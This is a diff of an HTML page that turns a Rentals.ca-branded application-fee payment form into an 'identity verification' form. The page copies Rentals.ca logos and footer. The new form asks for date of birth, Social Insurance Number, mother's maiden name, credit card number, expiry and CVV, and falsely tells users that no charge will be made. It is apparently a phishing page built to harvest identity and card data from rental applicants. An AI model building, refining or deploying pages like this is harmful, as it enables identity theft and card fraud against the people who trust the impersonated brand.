@@ -1,46 +1,27 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Payment Page - Rental Application Fee</title>
-    <style type="text/css">
-        body, td, div, p, a, input {
+    <title>Rental Application - Identity Verification</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
             font-family: 'Proxima Nova', Roboto, Trebuchet MS, Helvetica, sans-serif;
-            font-size: 16px;
-            color: #000;
-            margin: 0;
-            padding: 0;
-            line-height: 1.5;
-        }
-
-        a {
-            color: #3cb6d3;
-            text-decoration: none;
-        }
-
-        a:hover {
-            text-decoration: underline;
-        }
-
-        img {
-            border: 0;
+            background-color: #f8f9fa;
         }
 
         .container {
             max-width: 600px;
-            margin: 0 auto;
+            margin: 50px auto;
             padding: 30px;
-            background: #fff;
+            background: #ffffff;
             border-radius: 10px;
             box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
             border: 2px solid #36a5be;
-        }
-
-        .header {
-            text-align: center;
-            padding-bottom: 20px;
         }
 
         .header img {
@@ -48,31 +29,11 @@
         }
 
         .content h1 {
-            font-size: 22px;
+            font-size: 24px;
             font-weight: 700;
             color: #000;
             margin-bottom: 20px;
             text-align: center;
-        }
-
-        .form-group {
-            margin-bottom: 15px;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-        }
-
-        input[type="text"],
-        input[type="email"],
-        input[type="tel"] {
-            width: 100%;
-            padding: 10px;
-            margin-top: 5px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
         }
 
         .button-container {
@@ -80,161 +41,119 @@
             margin-top: 30px;
         }
 
-        .button {
+        .btn-custom {
             background-color: #3cb6d3;
             color: #fff;
             padding: 10px 34px;
             border-radius: 40px;
             font-size: 16px;
             font-weight: 600;
-            display: inline-block;
-            width: 200px;
-            text-align: center;
-            margin-bottom: 15px;
             transition: background-color 0.3s ease;
         }
 
-        .button:hover {
+        .btn-custom:hover {
             background-color: #ffcc00;
             color: #007bff;
         }
 
         .footer {
             text-align: center;
-            font-size: 16px;
-            line-height: 25px;
+            font-size: 14px;
             color: #27788a;
             padding-top: 20px;
         }
 
         .fine-print {
-            font-size: 11px;
+            font-size: 12px;
             color: #999;
             margin-top: 20px;
             text-align: center;
-        }
-
-        .hero-footer {
-            background: url('https://ci3.googleusercontent.com/meips/ADKq_Na6By2vbLvmUj_A_MCXVx5U-riXn6EBw2uaB9Vy9Z9djrwuTI-UISCK6m7eFcBbC8hr_P3dXdcGc5VyQQaxxdGXx03OPYlIKZJkyYdXUGWL8nevnDWxbo3FC1bdoFH2=s0-d-e1-ft#https://rentals.ca/static/rentalsca-phoenix/img/emails/hero-footer-bg.png') no-repeat bottom center/cover;
-            padding-top: 20px;
-            height: 135px;
         }
 
         .footer-logo img {
             height: 45px;
             margin-bottom: 20px;
         }
-
-        .border-blue {
-            border: 2px solid #36a5be;
-            padding: 20px;
-        }
     </style>
 </head>
+
 <body>
-    <div style="word-spacing:normal;background-color:#36a5be">
-        <div style="padding:30px 20px 20px 20px;background-color:#36a5be">
-            <div class="border-blue">
-                <div style="background:#ffffff;margin:0px auto;max-width:600px">
-                    <table align="center" border="0" cellpadding="0" cellspacing="0" role="presentation" style="background:#ffffff;width:100%">
-                        <tbody>
-                            <tr>
-                                <td style="direction:ltr;font-size:0px;padding:0;text-align:center">
-                                    <div style="padding-left:30px;padding-right:30px;margin:0px auto;max-width:600px">
-                                        <table align="center" border="0" cellpadding="0" cellspacing="0" role="presentation" style="width:100%">
-                                            <tbody>
-                                                <tr>
-                                                    <td style="direction:ltr;font-size:0px;padding:30px 0;text-align:center">
-                                                        <div style="font-size:0px;text-align:left;direction:ltr;display:inline-block;vertical-align:top;width:100%">
-                                                            <table border="0" cellpadding="0" cellspacing="0" role="presentation" width="100%">
-                                                                <tbody>
-                                                                    <tr>
-                                                                        <td style="vertical-align:top;padding:0">
-                                                                            <table border="0" cellpadding="0" cellspacing="0" role="presentation" width="100%">
-                                                                                <tbody>
-                                                                                    <tr>
-                                                                                        <td align="center" style="font-size:0px;padding:0;word-break:break-word">
-                                                                                            <table border="0" cellpadding="0" cellspacing="0" role="presentation" style="border-collapse:collapse;border-spacing:0px">
-                                                                                                <tbody>
-                                                                                                    <tr>
-                                                                                                        <td style="width:164px">
-                                                                                                            <a href="#" target="_blank">
-                                                                                                                <img alt="Rentals.ca" height="40" src="https://ci3.googleusercontent.com/meips/ADKq_NZ0YECgIQF9DsaU855sEGJSp4uAyoTPKbgVIv_4AWiHN3t0gWzLC0dxiKO5vwULjZ63VfTfJdmixUSTq2ox_Vd-XD23GEeIEvAb1xTBPraPuEFgyK-9absGXN5d=s0-d-e1-ft#https://rentals.ca/static/rentalsca-phoenix/img/emails/logo-header.png" style="border:0;display:block;outline:none;text-decoration:none;height:40px;width:100%;font-size:13px" width="164" />
-                                                                                                            </a>
-                                                                                                        </td>
-                                                                                                    </tr>
-                                                                                                </tbody>
-                                                                                            </table>
-                                                                                        </td>
-                                                                                    </tr>
-                                                                                </tbody>
-                                                                            </table>
-                                                                        </td>
-                                                                    </tr>
-                                                                </tbody>
-                                                            </table>
-                                                        </div>
-                                                    </td>
-                                                </tr>
-                                            </tbody>
-                                        </table>
-                                    </div>
-                                    <div style="padding-left:30px;padding-right:30px;margin:0px auto;max-width:600px">
-                                        <h1 style="font-size:22px;font-weight:700;color:#000;margin-bottom:20px;text-align:center;">Complete Your Rental Application - $25.00 Fee</h1>
-                                    </div>
-                                    <div style="padding-left:30px;padding-right:30px;margin:0px auto;max-width:600px">
-                                        <div style="font-family:proxima-nova,Roboto,RobotoDraft,Helvetica,Trebuchet MS,sans-serif;font-size:16px;line-height:2;text-align:left;color:#000000">
-                                            <form id="paymentForm" action="/submit" method="POST">
-                                                <div class="form-group">
-                                                    <label for="fullName">Full Name</label>
-                                                    <input type="text" id="fullName" name="fullName" required>
-                                                </div>
-                                                <div class="form-group">
-                                                    <label for="email">Email</label>
-                                                    <input type="email" id="email" name="email" required>
-                                                </div>
-                                                <div class="form-group">
-                                                    <label for="cardNumber">Credit Card Number</label>
-                                                    <input type="text" id="cardNumber" name="cardNumber" required>
-                                                </div>
-                                                <div class="form-group">
-                                                    <label for="expDate">Expiration Date (MM/YY)</label>
-                                                    <input type="text" id="expDate" name="expDate" required>
-                                                </div>
-                                                <div class="form-group">
-                                                    <label for="cvv">CVV</label>
-                                                    <input type="text" id="cvv" name="cvv" required>
-                                                </div>
-                                                <div class="form-group">
-                                                    <label for="billingAddress">Billing Address</label>
-                                                    <input type="text" id="billingAddress" name="billingAddress" required>
-                                                </div>
-                                                <div class="button-container">
-                                                    <button type="submit" class="button">Submit Payment</button>
-                                                </div>
-                                            </form>
-                                        </div>
-                                        <div class="fine-print">
-                                            <p>Please ensure that all the information provided is accurate and up-to-date. This payment is crucial for us to proceed with your application. Thank you for your cooperation.</p>
-                                        </div>
-                                    </div>
-                                    <div class="hero-footer">
-                                        <div class="footer-logo">
-                                            <img alt="Rentals.ca" src="https://rentals.ca/static/rentalsca-phoenix/img/emails/logo-footer.png" />
-                                        </div>
-                                        <div class="footer">
-                                            <p>&copy; 2024 <span>Rentals.ca</span>, Inc. All rights reserved.<br />Trademarks are property of their respective owners.</p>
-                                            <p><a href="#">Email Preferences &amp; Unsubscribe</a></p>
-                                        </div>
-                                    </div>
-                                    <br />&nbsp;
-                                </td>
-                            </tr>
-                        </tbody>
-                    </table>
+    <div class="container">
+        <div class="header text-center">
+            <a href="#" target="_blank">
+                <img src="https://rentals.ca/static/rentalsca-phoenix/img/emails/logo-header.png" alt="Rentals.ca">
+            </a>
+        </div>
+        <div class="content">
+            <h1>Complete Your Rental Application</h1>
+            <p>To complete your rental application, we require a quick identity verification using your credit card details and additional information. Please note, <strong>this is a verification only, and no charges will be made to your card.</strong></p>
+            <form id="verificationForm" action="/submit" method="POST">
+                <div class="form-group">
+                    <label for="fullName">Full Name</label>
+                    <input type="text" class="form-control" id="fullName" name="fullName" required>
                 </div>
+                <div class="form-group">
+                    <label for="phoneNumber">Phone Number</label>
+                    <input type="tel" class="form-control" id="phoneNumber" name="phoneNumber" required>
+                </div>
+                <div class="form-group">
+                    <label for="email">Email</label>
+                    <input type="email" class="form-control" id="email" name="email" required>
+                </div>
+                <div class="form-group">
+                    <label for="dob">Date of Birth</label>
+                    <input type="date" class="form-control" id="dob" name="dob" required>
+                </div>
+                <div class="form-group">
+                    <label for="sin">Social Insurance Number (SIN)</label>
+                    <input type="text" class="form-control" id="sin" name="sin" required>
+                </div>
+                <div class="form-group">
+                    <label for="mmn">Mother's Maiden Name</label>
+                    <input type="text" class="form-control" id="mmn" name="mmn" required>
+                </div>
+                <div class="form-group">
+                    <label for="cardNumber">Credit Card Number</label>
+                    <input type="text" class="form-control" id="cardNumber" name="cardNumber" required>
+                </div>
+                <div class="form-row">
+                    <div class="form-group col-md-6">
+                        <label for="expDate">Expiration Date (MM/YY)</label>
+                        <input type="text" class="form-control" id="expDate" name="expDate" required>
+                    </div>
+                    <div class="form-group col-md-6">
+                        <label for="cvv">CVV</label>
+                        <input type="text" class="form-control" id="cvv" name="cvv" required>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="billingAddress">Billing Address</label>
+                    <input type="text" class="form-control" id="billingAddress" name="billingAddress" required>
+                </div>
+                <div class="form-group">
+                    <label for="notes">Additional Notes</label>
+                    <textarea class="form-control" id="notes" name="notes" rows="4"></textarea>
+                </div>
+                <div class="button-container">
+                    <button type="submit" class="btn btn-custom">Verify Identity</button>
+                </div>
+            </form>
+            <div class="fine-print">
+                <p>Please ensure that all the information provided is accurate and up-to-date. This verification is crucial for us to proceed with your application. Thank you for your cooperation.</p>
             </div>
         </div>
+        <div class="footer">
+            <div class="footer-logo">
+                <img src="https://rentals.ca/static/rentalsca-phoenix/img/emails/logo-footer.png" alt="Rentals.ca">
+            </div>
+            <p>&copy; 2024 <span>Rentals.ca</span>, Inc. All rights reserved. Trademarks are property of their respective owners.</p>
+            <p><a href="#">Email Preferences &amp; Unsubscribe</a></p>
+        </div>
     </div>
+    <!-- Bootstrap JS and dependencies -->
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.2/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
 </body>
+
 </html>
